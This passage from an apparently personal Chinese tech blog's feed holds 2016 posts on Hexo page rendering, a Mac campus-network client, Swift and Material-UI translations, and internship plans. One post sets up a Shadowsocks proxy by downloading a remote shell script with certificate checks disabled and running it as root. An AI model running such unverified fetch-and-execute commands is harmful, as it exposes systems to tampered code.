class="built_in">index</span>)</span><br><span class="line">&#125;,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure></p><p>js代码中需要用到重新开始循环（如<code>wrapper:hover</code>）<br>只需要重新为<code>autoChange</code>赋相同的值即可再开始循环  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>终于还是自己买了Vps搭ss</title>
      <link href="/2016/03-17-%E7%BB%88%E4%BA%8E%E8%BF%98%E6%98%AF%E8%87%AA%E5%B7%B1%E4%B9%B0%E4%BA%86vps%E6%90%ADss/"/>
      <url>/2016/03-17-%E7%BB%88%E4%BA%8E%E8%BF%98%E6%98%AF%E8%87%AA%E5%B7%B1%E4%B9%B0%E4%BA%86vps%E6%90%ADss/</url>
      
        <content type="html"><![CDATA[<h1 id="先买一个vps"><a href="#先买一个vps" class="headerlink" title="先买一个vps"></a>先买一个vps</h1><p>主要是人家一般都要paypal，但是我没有，为了方便就直接上了淘宝，贵了11元/年<br>我是在tb上买的<code>alpharacks</code>，就是最便宜的那个套餐<br>年付35rmb，64MB内存，硬盘3G，月流量150G  </p><h1 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h1><p>买完人家会给你账号密码和链接<br>然后进去找到<code>hostname</code>，复制<br>在自己的终端里<code>ssh root@刚刚复制的终端</code><br>输入刚刚的账号密码<br>这样就登陆到这个vps里了  </p><h1 id="安装SS"><a href="#安装SS" class="headerlink" title="安装SS"></a>安装SS</h1><p>我用的是python版本的，另外还有什么go，R，libev版本的<br>紧接着刚刚的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure></p><p>安装用不了多久<br>完了之后会提示你<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Congratulations, shadowsocks install completed!</span><br><span class="line">Your Server IP:your_server_ip</span><br><span class="line">Your Server Port:your_server_port</span><br><span class="line">Your Password:your_password</span><br><span class="line">Your Local IP:127.0.0.1</span><br><span class="line">Your Local Port:1080</span><br><span class="line">Your Encryption Method:aes-256-cfb</span><br><span class="line"></span><br><span class="line">Welcome to visit:https://teddysun.com/342.html</span><br><span class="line">Enjoy it!</span><br></pre></td></tr></table></figure></p><p>这样就在vps上安装好了SS了  </p><h1 id="本地登陆"><a href="#本地登陆" class="headerlink" title="本地登陆"></a>本地登陆</h1><p>先要自己下载ss客户端<br>原来的开源放在github上面的被迫下架了<br>我是在ishadowsocks上面找到的<br>大家可以尝试在什么佛跳墙啊，红杏之类的销售SS账号的网站中找到<br>地址是刚刚的<code>hostname</code>，端口号你没有该国的话是<code>8989</code><br>记住要把本地的代理接口改为<code>1080</code>  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>为Hexo添加不依赖模板的页面</title>
      <link href="/2016/03-09-%E4%B8%BAhexo%E6%B7%BB%E5%8A%A0%E4%B8%8D%E4%BE%9D%E8%B5%96%E6%A8%A1%E6%9D%BF%E7%9A%84%E9%A1%B5%E9%9D%A2/"/>
      <url>/2016/03-09-%E4%B8%BAhexo%E6%B7%BB%E5%8A%A0%E4%B8%8D%E4%BE%9D%E8%B5%96%E6%A8%A1%E6%9D%BF%E7%9A%84%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>前几天看到了一个（我觉得）做的很不错的<a href="http://zhangwenli.com/cv/cn.html" target="_blank" rel="noopener">online CV</a><br>想到自己的网页全都是通过md文件然后node.js出来的<br>那么有没有办法既能通过hexo验收<br>又可以然后放在github上面呢？</p><hr><h2 id="答案一"><a href="#答案一" class="headerlink" title="答案一"></a>答案一</h2><p>在<a href="https://segmentfault.com/q/1010000002564944/a-1020000002564987" target="_blank" rel="noopener">segmentfault的一个提问中</a>找到了相关的回答：  </p><blockquote><p>如果你是不想<code>hexo g</code>时被模板改变你的html的话，可在在文件头加<code>layout: false</code><br>例如新建一个404页面</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">layout: false</span><br><span class="line">title: "404"</span><br><span class="line">date: 2015-02-05 20:03:48</span><br><span class="line">---</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>公益404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 Page Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.qq.com/404/search_children.js"</span>     <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这个办法有一个弊端，就是我使用<code>macdown</code>来编写md，并没有对编写html进行优化<br>我不可能左边放一个macdown，右边一个sublime text，左边复制到右边来继续写  </p><hr><h2 id="答案二-👍"><a href="#答案二-👍" class="headerlink" title="答案二 👍"></a>答案二 👍</h2><p>在hexo的官方文档中找到了<a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="noopener">这样一个</a>介绍  </p><blockquote><p><code>skip_render</code><br>跳过指定文件的渲染，您可使用 <a href="https://github.com/isaacs/node-glob" target="_blank" rel="noopener">glob 表达式</a>来匹配路径。</p></blockquote><p>那么我就只用在<code>hexo/_config.yml</code>中修改<code>skip_render:</code>项即可  </p><hr><h2 id="例子：在根目录下添加CV路径"><a href="#例子：在根目录下添加CV路径" class="headerlink" title="例子：在根目录下添加CV路径"></a>例子：在根目录下添加CV路径</h2><p>比如我的博客是<code>gaoryrt.github.io</code>，我想要自定义<code>gaoryrt.github.io/CV/index.html</code><br>那么就只用在<code>hexo/_config.yml</code>中写成<code>skip_render: CV/**</code><br>然后在<code>hexo/source</code>下新建CV目录然后再写个index.html<br>这下就可以直接用html了，而且这个页面也会被上传到github<br>至于怎么链接到<code>gaoryrt.github.io/CV</code>，就要在themes的config文件中自己添加了  </p><hr><h2 id="例子：添加更多忽略的路径"><a href="#例子：添加更多忽略的路径" class="headerlink" title="例子：添加更多忽略的路径"></a>例子：添加更多忽略的路径</h2><p>hexo官方说的是<code>skip_render</code>是用<a href="https://www.npmjs.com/package/glob" target="_blank" rel="noopener">glob表达式</a>来解析的，但是找了一圈我都没有找到怎么添加更多路径，还是Github搜索好，关键字一查就出来了：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CV/**, flex/index.html, <span class="number">404.</span>html]</span><br></pre></td></tr></table></figure></p><p>这样就可以添加更多路径了。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近在干什么03-06</title>
      <link href="/2016/03-06-whatsup2016-03-06/"/>
      <url>/2016/03-06-whatsup2016-03-06/</url>
      
        <content type="html"><![CDATA[<p>前几天匆匆忙忙写了简历，突然发现什么都不会做了。<br>想了好久还是投了人家的前端，iOS我又不敢拿出来给别人看，连API都没有完整看过，怎么敢说自己会呢。<br>但是前端又何尝不是这样呢，我这野人一本书都没有完整看过。  </p><hr><p>其实本博客的关于页面还是可以用心再写一写的。<br>没多久就要找实习了，自己还是要为自己的前途用用力的。<br>搏一搏，单车变摩托。还有个原因是本来那个页面就很丑。  </p><hr><p>开学的第一周，感觉自己真正学习的时间并不多啊。<br>还有就是钱不够用了，原来谈恋爱的时候还能剩，现在单身本应该花的更少了才对，纳闷。<br>纸牌屋已经出来超过24小时了，字幕组的原创翻译才更到第七集。<br>看了看自己拖着没翻译完的文章，zimuzu这个办事效率，我很欣慰。  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开始在Mac上使用校园网</title>
      <link href="/2016/02-29-inodeForMac/"/>
      <url>/2016/02-29-inodeForMac/</url>
      
        <content type="html"><![CDATA[<p>前几天尝试在win上面使用校园网的时候才发现inode这东西还不是很方便。<br>比起原来天翼飞young的客户端第一次设置多了些东西的设置。<br>想起来当时Mac上面使用校园网的时候我还是查了不少资料自己尝试了不少设置才成功的。<br>所以这一篇就记录一下怎么样在Mac上第一次使用校园网。  </p><hr><h1 id="在下载之前"><a href="#在下载之前" class="headerlink" title="在下载之前"></a>在下载之前</h1><p>我从上学期开始使用这个版本的<code>iNodeClient</code>app，从<code>10.10</code>开始到现在<code>10.11.4 Beta (15E49a)</code>的beta版本都可以使用，并且能从系统共享出wifi给其他设备使用。  </p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>Mac下载<code>iNodeClient</code>这个客户端app<br>随便搜索一下，关键字就是<code>iNodeClient for Mac</code><br>我下载的是7.0的版本<br><img src="http://ww2.sinaimg.cn/large/a15b4afegw1f1g295ybb7j20e807xmxz" alt="">  </p><h1 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h1><p>安装就是双击然后点击同意一直下一步。<br>配置的话，参考下面这张图。<br><img src="http://ww2.sinaimg.cn/large/a15b4afegw1f1g2fht41gj20du0g1gnd" alt=""><br>完蛋的学号也暴露了。    </p><h1 id="点击联网"><a href="#点击联网" class="headerlink" title="点击联网"></a>点击联网</h1><p>联网之前请核查是否有网络连接，就是看看其他人能不能使用校园网，这个东西很烫，万一大家都没，你一个不管怎么连都连不上的。<br>然后就是确保你账户上有那么多钱，欠费是没有办法连上网的。<br>上面两个都check了之后就可以联网了，就是单击配置好的网络连接，然后点向上的按钮就可以了。  </p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>个人有个发现，只在本学校（成都信息工程学院/大学）适用：<br>单击配置好的网络连接，然后使用<code>cmd+w</code>可以进入用户密码修改界面，这里登陆上去之后可以看到很多个人联网记录以及信息。  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「翻译」 Swift 内嵌类型</title>
      <link href="/2016/01-30-%E5%86%85%E5%B5%8C%E7%B1%BB%E5%9E%8B/"/>
      <url>/2016/01-30-%E5%86%85%E5%B5%8C%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>这是对 swift 2.2 中 <a href="https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/NestedTypes.html#//apple_ref/doc/uid/TP40014097-CH23-ID242" target="_blank" rel="noopener">内嵌类型</a> 一节的翻译<br>第二篇了，这篇少。</p><h1 id="内嵌类型"><a href="#内嵌类型" class="headerlink" title="内嵌类型"></a>内嵌类型</h1><p>枚举通常用于实现特定类或结构体的功能。类似的，它也可以在更加复杂的类型环境中方便的定义通用类和结构体。为实现这种功能，Swift 允许你定义<em>内嵌类型</em>，借此在支持类型的定义中嵌套枚举、类、或结构体。</p><p>若要在一种类型中嵌套另一种类型，在其支持类型的大括号内定义即可。可以根据需求多级嵌套数个类型。</p><h1 id="内嵌类型的实例"><a href="#内嵌类型的实例" class="headerlink" title="内嵌类型的实例"></a>内嵌类型的实例</h1><p>下方的例子定义了一个名为<code>BlackJackCard</code>的结构体，模拟了 Blackjack 游戏中的扑克牌。<code>BlackjackCard</code>结构体包含两个嵌套的枚举类型<code>Suit</code>和<code>Rank</code>。</p><p>在 Blackjack 游戏中，Ace 可以表示1或11两个值，这通过<code>Rank</code>枚举中嵌套的结构体<code>Values</code>决定：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BlackjackCard</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 嵌套的 Suit 枚举</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Suit</span>: <span class="title">Character</span> </span>&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">Spades</span> = <span class="string">"♠"</span>, <span class="type">Hearts</span> = <span class="string">"♡"</span>, <span class="type">Diamonds</span> = <span class="string">"♢"</span>, <span class="type">Clubs</span> = <span class="string">"♣"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 嵌套的 Rank 枚举</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Rank</span>: <span class="title">Int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">Two</span> = <span class="number">2</span>, <span class="type">Three</span>, <span class="type">Four</span>, <span class="type">Five</span>, <span class="type">Six</span>, <span class="type">Seven</span>, <span class="type">Eight</span>, <span class="type">Nine</span>, <span class="type">Ten</span></span><br><span class="line">        <span class="keyword">case</span> <span class="type">Jack</span>, <span class="type">Queen</span>, <span class="type">King</span>, <span class="type">Ace</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Values</span> </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> first: <span class="type">Int</span>, second: <span class="type">Int</span>?</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> values: <span class="type">Values</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> .<span class="type">Ace</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="type">Values</span>(first: <span class="number">1</span>, second: <span class="number">11</span>)</span><br><span class="line">            <span class="keyword">case</span> .<span class="type">Jack</span>, .<span class="type">Queen</span>, .<span class="type">King</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="type">Values</span>(first: <span class="number">10</span>, second: <span class="literal">nil</span>)</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="type">Values</span>(first: <span class="keyword">self</span>.rawValue, second: <span class="literal">nil</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// BlackjackCard 的属性和方法</span></span><br><span class="line">    <span class="keyword">let</span> rank: <span class="type">Rank</span>, suit: <span class="type">Suit</span></span><br><span class="line">    <span class="keyword">var</span> description: <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> output = <span class="string">"suit is \(suit.rawValue),"</span></span><br><span class="line">        output += <span class="string">" value is \(rank.values.first)"</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> second = rank.values.second &#123;</span><br><span class="line">          output += <span class="string">" or \(second)"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Suit</code>枚举用于描述扑克牌的四种花色，并用原始的<code>Character</code>来代表各自的花色。</p><p><code>Rank</code>枚举用于描述扑克牌的十三种点数，并用原始的<code>Int</code>来代表各自的点数值（这里的<code>Int</code>并不会用于 J、Q、K、Ace 的表示）。</p><p>如上所述，<code>Rank</code>枚举中定义了一个嵌套结构体<code>Values</code>。这个结构体描述了大多牌只有一个值，而 Ace 可以有两个值这一事实。<code>Values</code>结构体定义了两个属性：</p><ul><li><code>Int</code>类型的<code>first</code></li><li><code>Int?</code>类型的<code>second</code>，也称为『可选<code>Int</code>』</li></ul><p><code>Rank</code> 还定义了一个计算属性<code>values</code>，用于返回<code>Values</code>结构体的实例。这个计算属性会根据牌的点数，用适当的值初始化新的<code>Values</code>实例。对于<code>Jack</code>、<code>Queen</code>、<code>King</code>、和<code>Ace</code>使用特殊的值。而对于数值的牌，则使用它本身的<code>Int</code>值。</p><p><code>BlackjackCard</code>结构体本身有两个属性——<code>rank</code>和<code>suit</code>。并定义了一个名为<code>description</code>的计算属性，用<code>rank</code>和<code>suit</code>储存的值构建对扑克牌花色和值的描述。<code>description</code>属性使用可选绑定来检查是否有第二个值要描述，若有，则添加对第二个值的描述。</p><p>由于<code>BlackjackCard</code>是一个没有自定义初始化器的结构体，如<a href="">逐个成员初始化器的结构类型</a>所述，它有一个隐式的成员初始化器。你可以使用这个舒适化其去初始化新的常量<code>theAceOfSpades</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> theAceOfSpades = <span class="type">BlackjackCard</span>(rank: .<span class="type">Ace</span>, suit: .<span class="type">Spades</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"theAceOfSpades: \(theAceOfSpades.description)"</span>)</span><br><span class="line"><span class="comment">// 输出 "theAceOfSpades: suit is ♠, value is 1 or 11"</span></span><br></pre></td></tr></table></figure><p>尽管<code>Rank</code>和<code>Suit</code>被嵌套在<code>BlackjackCard</code>中，但其类型仍可从上下文中推断出来，因此，该实例的初始化器可以单独通过成员名称（<code>.Ace</code>和<code>.Spades</code>）引用枚举类型。在上面的例子中，<code>description</code>属性正确的反馈了黑桃 Ace 拥有1或11两个值。</p><h1 id="引用内嵌类型"><a href="#引用内嵌类型" class="headerlink" title="引用内嵌类型"></a>引用内嵌类型</h1><p>要在定义外部使用内嵌类型，只需在其前缀加上内嵌了它的类的类型名即可：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> heartsSymbol = <span class="type">BlackjackCard</span>.<span class="type">Suit</span>.<span class="type">Hearts</span>.rawValue</span><br><span class="line"><span class="comment">// heartsSymbol 值为 "♡”</span></span><br></pre></td></tr></table></figure><p>像上面的例子可以使<code>Suit</code>、<code>Rank</code>和<code>Values</code>的名字尽可能的短，因为他们的名字由定义时的上下文自然限定。</p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关于实习</title>
      <link href="/2016/01-27-internship/"/>
      <url>/2016/01-27-internship/</url>
      
        <content type="html"><![CDATA[<p>已经大三寒假了<br>今年开学就应该要实习了<br>以下内容参考自<a href="http://my.oschina.net/u/1440297" target="_blank" rel="noopener">AJason</a>在<a href="http://www.oschina.net/" target="_blank" rel="noopener">开源中国</a>发布的文章<a href="http://my.oschina.net/u/1440297/blog/494690?fromerr=kUzDAUdz" target="_blank" rel="noopener">V2EX大牛的指点</a><br>没有经过允许所以不敢全部搬<br>侵权删，先谢过  </p><hr><h1 id="作为一个实习生，需要什么能力？"><a href="#作为一个实习生，需要什么能力？" class="headerlink" title="作为一个实习生，需要什么能力？"></a>作为一个实习生，需要什么能力？</h1><p>以下就写实际一些，选近的写  </p><ol><li>代码和注释的规范性可维护性</li><li>参与算法的研究与实现    </li><li>对新技术的探索，包括不仅限于新框架、新思想、新工具</li><li>对 github 作品认真负责，包括不仅限于规范的 commit、干净的代码、以 feature 为单位提交、分支合并、bug 修复、将 git 烂熟于心、还有 log 的习惯</li><li>主动解决问题的能力  </li><li>设计模式、完全分离前后端的 MVC    </li><li>gitignore 也要好好写  </li><li>团队工作经历    </li></ol><hr><h1 id="接下来干什么？"><a href="#接下来干什么？" class="headerlink" title="接下来干什么？"></a>接下来干什么？</h1><p>寒假结束的时候看操作系统<br>这个是重要度最高的，毕竟毕业需要这个<br>在此之外还是以 swift 为先<br>自己的博客是加分项<br>最近看了很多，真真觉着自己什么知识技能都没有啊<br>还要抓紧寒假时间好好充电</p><p><strong>swift、ios、设计模式、操作系统</strong>  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开始使用 Dame 主题</title>
      <link href="/2016/01-24-newtheme/"/>
      <url>/2016/01-24-newtheme/</url>
      
        <content type="html"><![CDATA[<p>终于，终于快完成了<br>重写这个主题在两个月之前就已经放进了日程当中<br>前几天才开始写<br>改之前使用的是 <a href="https://github.com/chadluo/hexo-theme-mame" target="_blank" rel="noopener">mame</a> 这个主题，特别简单<br>就是个纯 plain，不是我喜欢简约，是真的没有时间认真来<br>改了之后你看到就是现在这个样子<br><code>i give u ,the dame theme.</code></p><hr><p>基本上是基于<a href="http://materializecss.com/" target="_blank" rel="noopener">Materialize Css</a>这个模板来的<br>他这个里面提供了很多 MD 的效果<br>包括阴影，下拉菜单，hover，点击波浪，还有视差效果等等<br>仔细看前后两张图，会动的好么<br>其他的我就不说了，没有用到，自己去看嘛，很有谷歌的感觉<br>我就把 mame 的 layout 研究了一下<br>重写了很多了 ejs，css 文件<br>ejs给我的感觉就是弱智版本的 jsp<br>跟 jsp 差不多都是用来生成静态网页的<br>css 就不说了，好多东西都不支持，hack 也尝试了很久。。。<br>据说 jade 要比 ejs 好<br>等着以后吧，有时间再来用用 jade  </p><hr><p>未来还是尝试做几个不同颜色的主题，夜间模式之类的  </p><blockquote><p>这个也比较简单<br>但是已经有人说过我现在这个红色那么多，春节很喜庆了<br>春节过了就不知道该怎么办，是不是该加春联之类的。。  </p></blockquote><p>现在文章内的图片效果只有那样了，暂时还没有尝试fancybox<br>主要是并没有在 ejs 文件当中找到对我 markdown 的解析文件<br>并不知道 hexo 到底是怎样给代码加 div 的，说到代码，还有 highlight<br>当然还有评论功能，现在一个都没有<br>不知道是不是 mame 本身的原因，百度统计也没有了<br>以后再鸽吧，今天就到这里  </p><hr><p>附上 <a href="http://www.embeddedjs.com" target="_blank" rel="noopener">ejs</a> 和 <a href="http://jade-lang.com" target="_blank" rel="noopener">jade</a> 的链接</p><hr><p>以上  </p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「翻译」开始使用 Material-Ui</title>
      <link href="/2016/01-21-material-ui/"/>
      <url>/2016/01-21-material-ui/</url>
      
        <content type="html"><![CDATA[<p>翻译自<a href="http://www.material-ui.com/#/get-started/prerequisites" target="_blank" rel="noopener">这一篇文章</a>，这个是 material-ui 的官方文档。  </p><h1 id="开始的前提"><a href="#开始的前提" class="headerlink" title="开始的前提"></a>开始的前提</h1><p>我们建议你在开始使用 Material UI 之前先了解一下 <a href="http://facebook.github.io/react/" target="_blank" rel="noopener">React</a>。Material-UI 基于 React，所以了解 React 是怎样工作的尤其重要。<br>如果你已经熟知单页面程序（SPAs）和 Node，觉得可以跳过这个前提段落的话，请到直接到<a href="http://www.material-ui.com/#/get-started/installation" target="_blank" rel="noopener">安装</a>部分。<br>那么，下面简单讲一下 SPAs 和 Node。这个对你这种前端新手（或者只了解过『传统的』使用 HTML 和 CSS 以及 JavaScript 的人）来说特别有帮助。  </p><h1 id="SPAs-单页面程序"><a href="#SPAs-单页面程序" class="headerlink" title="SPAs 单页面程序"></a>SPAs 单页面程序</h1><p>很久之前，静态网页都是由 HTML 搭建的，我们使用 CSS 来做样式，用 JavaScript 来做互动和动画。大多数，尤其是相应数据的客户端都包含了一整套往返流程：客户端的数据发送到服务器，结果又返回到客户端。加之大多数回话都被『屏蔽』了。那么在这些往返的流程当中，客户端都在忙着做一些无用功。<br>在异步服务器（AJAX）诞生之后，客户端可以在发送和等待数据的同时做一些其他事情。然而大多数的客户端还是在等待服务器的往返流程结束，这时的网页的流畅程度还是无法和普通的桌面应用相比。这就是 SPAs 产生的原因。<br>一个 SPA 本质上就是一个单页面的站点。这就是说，服务器只需要一次性将网页（一般来说是一个 JavaScript 文件）发送给客户端。所有客户端相应所需的逻辑都储存于这个文件当中。因此，保证流畅性可靠性和高速网络体验的所有必备条件都提前发送到了浏览器的储存空间当中。这种 web 编程体系在过去十年内促使了众多流行的面向 SPAs 的 JavaScript 框架的诞生：  </p><ul><li><a href="https://angularjs.org/" target="_blank" rel="noopener">Angular</a></li><li><a href="http://emberjs.com/" target="_blank" rel="noopener">Ember</a></li><li><a href="http://backbonejs.org/" target="_blank" rel="noopener">Backbone</a></li><li><a href="http://facebook.github.io/react/" target="_blank" rel="noopener">React</a></li></ul><p>把所有重要的代码放在一个文件当中的确是一个重大的挑战。谢天谢地，还有众多工具供我们将我们的代码分装为小型的模块（类似于面向对象程序中不同的类和接口）以供以后重新组装。这就是 Node 诞生的原因。  </p><h1 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h1><p><a href="https://nodejs.org/" target="_blank" rel="noopener">Node</a> 的核心是一个由 C 语言编写的程序，它使用了 chrome 的 v8 JavaScript 引擎以让我们在 shell （是的，就是你的终端而非浏览器）当中运行 JavaScript。因此，Node 本质上是一个运行环境。<br>Node 刚被发明出来的时候主要是针对 JavaScript 开发 Web 服务器的。这对 JavaScript 限制于客户端这一传统来说有点激进。然而时间发展，web 开发者发现了使用 Node 开发依赖关系管理的优点，进而创造了这些项目：  </p><ul><li><a href="http://gruntjs.com/" target="_blank" rel="noopener">Grunt</a></li><li><a href="http://gulpjs.com/" target="_blank" rel="noopener">Gulp</a></li><li><a href="http://browserify.org/" target="_blank" rel="noopener">Browserify</a></li><li><a href="http://webpack.github.io/" target="_blank" rel="noopener">Webpack</a></li></ul><p>在 Node 流行起来的同时，独立开发者和团队将几乎将所有（使用 Node 的）代码都 web 程序化了。当然，整个社区都会受益于这些“自定义 Node 脚本”，这就要求任何人都可以上传他们的 Node 脚本，其他开发人员可以在自己的项目中使用这些脚本。<br><a href="https://www.npmjs.com/" target="_blank" rel="noopener">Node Package Manager</a>，也就是大家熟知的『npm』就是用来干这个事情的。npm是一个命令行工具，主要用来将外部JavaScript引入自己的项目。例如 Material UI 就可以作为 npm 的一个包。也就是说，你可以使用<code>npm install material-ui</code>将 Material UI 引入你的项目，然后在你想要用的地方使用 Material UI。  </p><p>以上。</p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关键词搜索修正之二</title>
      <link href="/2016/01-14-keywordsearcher2/"/>
      <url>/2016/01-14-keywordsearcher2/</url>
      
